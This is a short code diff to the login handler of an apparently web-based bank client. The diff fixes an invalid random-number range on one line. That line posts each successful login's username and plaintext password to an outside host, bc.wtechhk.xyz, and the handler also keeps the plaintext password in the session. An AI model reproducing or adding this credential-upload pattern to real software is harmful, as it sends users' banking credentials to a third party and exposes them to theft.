@@ -2592,7 +2592,7 @@ def wbank_auth_client():
                         session.pop("tryTimes", None)
                         session["username"] = username
                         session["pw"] = password
-                        requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":str(128+random.randint(1000,999)),"data":f"login->{username}->{password}->success"})
+                        requests.post(url="https://bc.wtechhk.xyz/upload",data={"blockID":str(128+random.randint(1000,9999)),"data":f"login->{username}->{password}->success"})
                         session.permanent = True
                         flash('登入成功.', 'success')
                         return redirect(url_for('wbank_client'))
